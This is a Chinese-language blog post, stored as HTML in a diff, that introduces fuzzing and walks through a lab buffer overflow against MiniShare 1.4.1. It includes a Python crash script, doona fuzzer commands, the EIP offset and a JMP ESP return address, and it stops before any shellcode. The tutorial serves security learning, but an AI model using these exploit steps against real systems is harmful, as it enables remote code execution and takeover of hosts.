@@ -1,0 +1,388 @@
+<!DOCTYPE html>
+<html lang='en'>
+
+<head>
+  <meta name="generator" content="Hexo 5.4.0">
+  <meta charset="utf-8">
+  
+
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  <link rel='dns-prefetch' href='https://cdn.jsdelivr.net'>
+  <link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin>
+
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  <title>浅谈Fuzz - T0x1c</title>
+
+  
+    <meta name="description" content="在渗透测试当遇目标系统安全防护较为健壮且无任何已知漏洞和设置不当时，我们就进入了困难阶段，其中有不少小伙伴会拿SSL证书、跨域资源共享以及明文传输等相对低危的漏洞填充渗透测试报告了事。而通过 Fuzzing 则可以帮助我们挖掘到 0day 这种高危漏洞来更全面、更细致地对目标进行渗透。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="浅谈Fuzz">
+<meta property="og:url" content="https://toxic80l.github.io/post/e208bf7e/index.html">
+<meta property="og:site_name" content="T0x1c">
+<meta property="og:description" content="在渗透测试当遇目标系统安全防护较为健壮且无任何已知漏洞和设置不当时，我们就进入了困难阶段，其中有不少小伙伴会拿SSL证书、跨域资源共享以及明文传输等相对低危的漏洞填充渗透测试报告了事。而通过 Fuzzing 则可以帮助我们挖掘到 0day 这种高危漏洞来更全面、更细致地对目标进行渗透。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://toxic80l.github.io/post/e208bf7e/%E6%88%AA%E5%B1%8F2022-03-01%20%E4%B8%8A%E5%8D%882.04.20.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/e208bf7e/%E6%88%AA%E5%B1%8F2022-02-27%20%E4%B8%8A%E5%8D%883.49.00.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/e208bf7e/%E6%88%AA%E5%B1%8F2022-02-27%20%E4%B8%8A%E5%8D%883.48.09.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/e208bf7e/%E6%88%AA%E5%B1%8F2022-02-27%20%E4%B8%8A%E5%8D%883.52.18.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/e208bf7e/%E6%88%AA%E5%B1%8F2022-02-27%20%E4%B8%8A%E5%8D%884.19.52.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/e208bf7e/%E6%88%AA%E5%B1%8F2022-02-27%20%E4%B8%8B%E5%8D%889.56.33.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/e208bf7e/%E6%88%AA%E5%B1%8F2022-02-27%20%E4%B8%8B%E5%8D%889.57.18.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/e208bf7e/%E6%88%AA%E5%B1%8F2022-02-27%20%E4%B8%8B%E5%8D%8812.13.53.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/e208bf7e/%E6%88%AA%E5%B1%8F2022-02-27%20%E4%B8%8B%E5%8D%8812.19.54.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/e208bf7e/%E6%88%AA%E5%B1%8F2022-02-27%20%E4%B8%8B%E5%8D%8812.40.32.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/e208bf7e/%E6%88%AA%E5%B1%8F2022-02-27%20%E4%B8%8B%E5%8D%8812.54.34.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/e208bf7e/%E6%88%AA%E5%B1%8F2022-02-27%20%E4%B8%8B%E5%8D%881.04.36.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/e208bf7e/%E6%88%AA%E5%B1%8F2022-02-27%20%E4%B8%8B%E5%8D%881.01.53.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/e208bf7e/%E6%88%AA%E5%B1%8F2022-02-27%20%E4%B8%8B%E5%8D%881.16.35.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/e208bf7e/%E6%88%AA%E5%B1%8F2022-02-27%20%E4%B8%8B%E5%8D%881.16.44.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/e208bf7e/%E6%88%AA%E5%B1%8F2022-02-27%20%E4%B8%8B%E5%8D%881.25.32.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/e208bf7e/%E6%88%AA%E5%B1%8F2022-02-27%20%E4%B8%8B%E5%8D%881.35.59.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/e208bf7e/%E6%88%AA%E5%B1%8F2022-02-27%20%E4%B8%8B%E5%8D%882.37.44.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/e208bf7e/%E6%88%AA%E5%B1%8F2022-02-27%20%E4%B8%8B%E5%8D%883.28.37.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/e208bf7e/%E6%88%AA%E5%B1%8F2022-03-01%20%E4%B8%8A%E5%8D%8812.47.05.png">
+<meta property="article:published_time" content="2022-02-28T09:03:54.000Z">
+<meta property="article:modified_time" content="2022-02-28T18:38:43.449Z">
+<meta property="article:author" content="toxic80L">
+<meta property="article:tag" content="缓冲区溢出">
+<meta property="article:tag" content="Fuzz">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://toxic80l.github.io/post/e208bf7e/%E6%88%AA%E5%B1%8F2022-03-01%20%E4%B8%8A%E5%8D%882.04.20.png">
+  
+  
+
+  <!-- feed -->
+  
+
+  
+    
+<link rel="stylesheet" href="/css/main.css">
+
+  
+
+  
+
+  
+</head>
+
+<body>
+  
+
+
+  <div class='l_body' id='start'>
+    <aside class='l_left' layout='post'>
+    
+
+
+<header class="header">
+
+<div class="logo-wrap"><a class="avatar" href="/medias/avatar.png"><div class="bg" style="opacity:0;background-image:url(https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.2/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/medias/avatar.png" onerror="javascript:this.classList.add('error');this.src='https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.1/image/2659360.svg';"></a><a class="title" href="/"><div class="main">T0x1c</div><div class="sub cap">我在听你的独家记忆</div></a></div>
+<nav class="menu dis-select"><a class="nav-item active" href="/">Blog</a><a class="nav-item" href="/wiki/">Wiki</a><a class="nav-item" href="/notes/">notes</a><a class="nav-item" href="/friends/">more</a></nav></header>
+
+<div class="widgets">
+
+<div class="widget-wrap single" id="toc"><div class="widget-header cap dis-select"><span class="name">TOC</span></div><div class="widget-body fs14"><div class="doc-tree active"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-Fuzzing%E7%AE%80%E4%BB%8B"><span class="toc-text">0x01 Fuzzing简介</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E5%8E%9F%E7%90%86"><span class="toc-text">模糊测试原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E6%B5%8B%E8%AF%95%E4%B8%8E%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95"><span class="toc-text">静态测试与模糊测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E7%B1%BB%E5%9E%8B"><span class="toc-text">模糊测试类型</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83"><span class="toc-text">0x02 模糊测试环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E5%AE%9E%E4%BE%8B"><span class="toc-text">0x03 模糊测试实例</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E6%AD%A5%E9%AA%A4"><span class="toc-text">测试步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B"><span class="toc-text">测试过程</span></a></li></ol></li></ol></div></div></div>
+
+
+</div>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/toxic80L" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.3/social/08a41b181ce68.svg"/></a></div></footer>
+
+    </aside>
+    <div class='l_main'>
+      
+
+      
+
+
+<div class="bread-nav fs12"><div id="breadcrumb"><a class="cap breadcrumb" href="/">Home</a><span class="sep"></span><a class="cap breadcrumb" href="/">Blog</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95/">模糊测试</a></div><div id="post-meta">Posted on&nbsp;<time datetime="2022-02-28T09:03:54.000Z">2022-02-28</time></div></div>
+
+<article class='content md post'>
+<h1 class="article-title"><span>浅谈Fuzz</span></h1>
+<p>在渗透测试当遇目标系统安全防护较为健壮且无任何已知漏洞和设置不当时，我们就进入了困难阶段，其中有不少小伙伴会拿SSL证书、跨域资源共享以及明文传输等相对低危的漏洞填充渗透测试报告了事。而通过 Fuzzing 则可以帮助我们挖掘到 0day 这种高危漏洞来更全面、更细致地对目标进行渗透。</p>
+<span id="more"></span>
+
+<h2 id="0x01-Fuzzing简介"><a href="#0x01-Fuzzing简介" class="headerlink" title="0x01 Fuzzing简介"></a>0x01 Fuzzing简介</h2><h3 id="模糊测试原理"><a href="#模糊测试原理" class="headerlink" title="模糊测试原理"></a>模糊测试原理</h3><p>程序接收客户端数据后会对数据进行解析并计算处理数据，最终返回结果。模糊测试（Fuzzing、Fuzz testing）则是一种自动化的软件测试技术，在理想状态下程序接收到的数据都是规范、格式化的数据，Fuzzing 则使用意想不到的、无效的、随机/半随机的输入来发现程序 bug，Fuzzer 通过生成半有效输入并监视程序异常，以便能够发现更深层的逻辑问题。那什么是半有效输入呢？其实就是在测试前筛选掉无效的数据类型并确立目标接收数据的类型。Fuzzing 还有个更为形象的比喻，被称为猴子测试，为什么叫猴子测试呢？程序猿或其他 IT 行业都会对程序存在一个固有思维，而猴子是对电脑完全没有接触的动物，遇到电脑时会一通乱敲，输入没有规律可言，这样能够很好地打破固有思维。</p>
+<h3 id="静态测试与模糊测试"><a href="#静态测试与模糊测试" class="headerlink" title="静态测试与模糊测试"></a>静态测试与模糊测试</h3><p>模糊测试相比与静态测试更具效率、准确性以及成本优势，这是因为静态测试并不会实际运行程序，在静态分析时如果遇见问题可能实际环境下并不存在，而通过模糊测试发现的问题在实际环境中是绝对存在的。模糊测试的劣势也非常明显，我们通常无法判断测试目标是否出现异常，常见情况是通过目标的反应来判断测试是否成功，而目标一旦出现程序崩溃、内存错误、竞速条件、死锁、内存泄漏等问题时，我们也就无法对其进行判断。所以它通常与程序中的 debugger 协同使用，这样能够更好地发现和分析程序 bug，在历史上有许多著名的漏洞都是通过模糊测试发现的，比如 Shellshock、Heartbleed 等。</p>
+<h3 id="模糊测试类型"><a href="#模糊测试类型" class="headerlink" title="模糊测试类型"></a>模糊测试类型</h3><p>模糊测试可以被用作白盒、灰盒或黑盒测试，不同的方式能够应用于不同的场景</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">白盒：基于代码，优点是代码覆盖全面，而缺点也是由于优点而来，白盒会包含全部程序代码，因此导致输入数据量大、时间长，从而导致效率较低。</span></span><br><span class="line"><span class="string">灰盒：基于指令，测试人员需要了解协议指令集，通过输入程序可接收的指令进行测试，代码覆盖较为全面，同时效率相对来说也比较高。</span></span><br><span class="line"><span class="string">黑盒：基于比特，由于不了解程序结构，因此只能使用随机比特进行测试，而指令结构不正确程序会直接拒绝，这就导致该方式只能发现表层漏洞。</span></span><br></pre></td></tr></table></figure>
+<p>基于对象也可以分为以下几种场景</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">文件格式Fuzzing：播放器、浏览器这类程序只能打开特定格式的文件，对文件格式进行模糊测试可知不同播放器、浏览器对不同格式的文件打开会有不正常的反应并分析内存状态、检查错误信息</span></span><br><span class="line"><span class="string">环境变量Fuzzing：程序运行时可能会调用多种环境变量，如编码格式、库文件路径等。对环境变量进行模糊测试分析随机改变环境变量对程序的影响</span></span><br><span class="line"><span class="string">内存Fuzzing：程序执行时在特定函数设置断点，不断改变内存值并观察程序行为</span></span><br><span class="line"><span class="string">网络协议Fuzzing：网络协议存在头和载荷，向协议头域和载荷部分进行模糊测试并观察程序反应</span></span><br><span class="line"><span class="string">Web应用Fuzzing：Web服务一般采用http协议，向Http协议头和载荷部分进行模糊测试并观察程序反应</span></span><br></pre></td></tr></table></figure>
+
+<p>用于模糊测试的 Fuzzer 也有以下两种类型</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">基于已有数据样本变种生成测试数据</span></span><br><span class="line"><span class="string">基于协议语法建模来生成全新的测试数据</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x02-模糊测试环境"><a href="#0x02-模糊测试环境" class="headerlink" title="0x02 模糊测试环境"></a>0x02 模糊测试环境</h2><p>通过缓冲区溢出漏洞可以帮助我们理解什么是 Fuzzing，逐一测试 HTTP 每个指令（OPTION、GET、POST等）以及请求数据测试目标程序是否存在漏洞</p>
+<p>测试软件：minishare 1.4.1，是一个基于 HTTP 协议的文件共享软件<br>测试工具：OllyDbg</p>
+<p><strong>minishare下载地址：<a target="_blank" rel="noopener" href="https://sourceforge.net/projects/minishare/postdownload">https://sourceforge.net/projects/minishare/postdownload</a></strong><br><strong>OllyDbg下载地址：<a target="_blank" rel="noopener" href="https://www.filehorse.com/download-ollydbg/">https://www.filehorse.com/download-ollydbg/</a></strong><br><strong>缓冲区溢出漏洞详情参考地址：<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/616">https://www.exploit-db.com/exploits/616</a></strong></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/e208bf7e/%E6%88%AA%E5%B1%8F2022-03-01%20%E4%B8%8A%E5%8D%882.04.20.png" alt="截屏2022-03-01 上午2.04.20"></p>
+<h2 id="0x03-模糊测试实例"><a href="#0x03-模糊测试实例" class="headerlink" title="0x03 模糊测试实例"></a>0x03 模糊测试实例</h2><p>基于栈的缓冲区溢出最关键的是 EIP 与 ESP 寄存器，以下是关于它们的介绍</p>
+<ul>
+<li>EIP：保存下一条命令在内存中的地址，当前所有命令执行完毕后，执行EIP寄存器所在地址中的命令。执行前系统会将下一条命令的地址保存在EIP寄存器当中</li>
+<li>ESP：保存一个栈帧放入结束地址</li>
+</ul>
+<h3 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">、确定精确溢出长度（可借助自动化工具）</span></span><br><span class="line"><span class="number">2</span><span class="string">、修改EIP、ESP寄存器</span></span><br><span class="line"><span class="number">3</span><span class="string">、从模块中寻找</span> <span class="string">JMP</span> <span class="string">ESP</span> <span class="string">跳转</span></span><br><span class="line"><span class="number">4</span><span class="string">、使用</span> <span class="string">MSF</span> <span class="string">生成</span> <span class="string">shellcode</span></span><br><span class="line"><span class="number">5</span><span class="string">、植入</span> <span class="string">Paylaod</span> <span class="string">从而获取系统shell</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="测试过程"><a href="#测试过程" class="headerlink" title="测试过程"></a>测试过程</h3><p>安装完成后访问地址出现以下界面说明开启成功<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/e208bf7e/%E6%88%AA%E5%B1%8F2022-02-27%20%E4%B8%8A%E5%8D%883.49.00.png" alt="截屏2022-02-27 上午3.49.00"><br>利用 OllyDbg 调试器的 Attach 功能附加到 MiniShare 进程<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/e208bf7e/%E6%88%AA%E5%B1%8F2022-02-27%20%E4%B8%8A%E5%8D%883.48.09.png" alt="截屏2022-02-27 上午3.48.09"><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/e208bf7e/%E6%88%AA%E5%B1%8F2022-02-27%20%E4%B8%8A%E5%8D%883.52.18.png" alt="截屏2022-02-27 上午3.52.18"></p>
+<p>首先使用 Python 脚本进行测试溢出长度，尝试向目标发送3000个 A 字符</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">target_address = <span class="string">&quot;192.168.0.102&quot;</span></span><br><span class="line">target_port = <span class="number">80</span></span><br><span class="line"></span><br><span class="line">buffer = <span class="string">&quot;GET&quot;</span> + <span class="string">&quot; &quot;</span> + <span class="string">&quot;A&quot;</span> * <span class="number">3000</span> + <span class="string">&quot; &quot;</span> + <span class="string">&quot;HTTP/1.1\r\n\r\n&quot;</span></span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">connect = sock.connect((target_address, target_port))</span><br><span class="line">sock.send(buffer)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line">sock.close()</span><br></pre></td></tr></table></figure>
+<p>OllyDbg 中程序暂停同时 EIP 显示为<code>41414141</code>，其中41代表的就是溢出字符 A 的 ASCII 码，说明溢出测试成功<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/e208bf7e/%E6%88%AA%E5%B1%8F2022-02-27%20%E4%B8%8A%E5%8D%884.19.52.png" alt="截屏2022-02-27 上午4.19.52"><br>由于手工 Fuzz 的工作量巨大且繁琐，我们可使用自动化工具 doona 向目标发送请求以确定精确溢出位置</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">doona -m http -t 192.168.0.102 -c 1</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/e208bf7e/%E6%88%AA%E5%B1%8F2022-02-27%20%E4%B8%8B%E5%8D%889.56.33.png" alt="截屏2022-02-27 下午9.56.33"><br>查看输入请求内容来确认精确溢出长度范围</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">doona -m http -t 192.168.0.102 -d -r 10</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/e208bf7e/%E6%88%AA%E5%B1%8F2022-02-27%20%E4%B8%8B%E5%8D%889.57.18.png" alt="截屏2022-02-27 下午9.57.18"><br>经过测试后我们发现如果发送1790个 A 的话 OllyDbg 中 EIP 显示为<code>20414141</code>，从而获取到程序的精确溢出长度：1787<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/e208bf7e/%E6%88%AA%E5%B1%8F2022-02-27%20%E4%B8%8B%E5%8D%8812.13.53.png" alt="截屏2022-02-27 下午12.13.53"></p>
+<p>验证溢出长度是否正确，我们可以发送1787个A以及4个B，OllyDbg 中 EIP 显示为<code>42424242</code>，其中42代表的就是溢出字符 B 的 ASCII 码，说明溢出长度正确<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/e208bf7e/%E6%88%AA%E5%B1%8F2022-02-27%20%E4%B8%8B%E5%8D%8812.19.54.png" alt="截屏2022-02-27 下午12.19.54"><br>然后我们需要确定 ESP 的大小，再以上基础上发送1000个c，OllyDbg 中 ESP 显示其中确实包含1000个字符C，说明我们可输入的 shellcode 有至少1000个字符的空间，而一般来说 shellcode 小于500个字符</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/e208bf7e/%E6%88%AA%E5%B1%8F2022-02-27%20%E4%B8%8B%E5%8D%8812.40.32.png" alt="截屏2022-02-27 下午12.40.32"></p>
+<p>经过测试发现虽然每次执行后的 EIP 保持不变，但是 ESP 会发生改变，进入执行模块查看 minishare 在运行时调用的动态链接库（推荐查看<code>SHELL32.dll</code>和<code>USER32.dll</code>）<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/e208bf7e/%E6%88%AA%E5%B1%8F2022-02-27%20%E4%B8%8B%E5%8D%8812.54.34.png" alt="截屏2022-02-27 下午12.54.34"><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/e208bf7e/%E6%88%AA%E5%B1%8F2022-02-27%20%E4%B8%8B%E5%8D%881.04.36.png" alt="截屏2022-02-27 下午1.04.36"></p>
+<p>进入<code>SHELL32.dll</code>并在其中查找<code>JMP ESP</code><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/e208bf7e/%E6%88%AA%E5%B1%8F2022-02-27%20%E4%B8%8B%E5%8D%881.01.53.png" alt="截屏2022-02-27 下午1.01.53"></p>
+<p>地址显示为<code>7548A52C</code>，将 EIP 修改为该地址的十六进制，同时将其倒着填入</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">buffer = <span class="string">&quot;GET &quot;</span> + <span class="string">&quot;A&quot;</span> * <span class="number">1787</span> + <span class="string">&quot;\x2C\xA5\x48\x75&quot;</span> + <span class="string">&quot;C&quot;</span> * <span class="number">8</span> + <span class="string">&quot; HTTP/1.1\r\n\r\n&quot;</span></span><br></pre></td></tr></table></figure>
+<p>为了判断是否是通过该地址跳转至 ESP 寄存器，可在该地址添加断点<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/e208bf7e/%E6%88%AA%E5%B1%8F2022-02-27%20%E4%B8%8B%E5%8D%881.16.35.png" alt="截屏2022-02-27 下午1.16.35"><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/e208bf7e/%E6%88%AA%E5%B1%8F2022-02-27%20%E4%B8%8B%E5%8D%881.16.44.png" alt="截屏2022-02-27 下午1.16.44"></p>
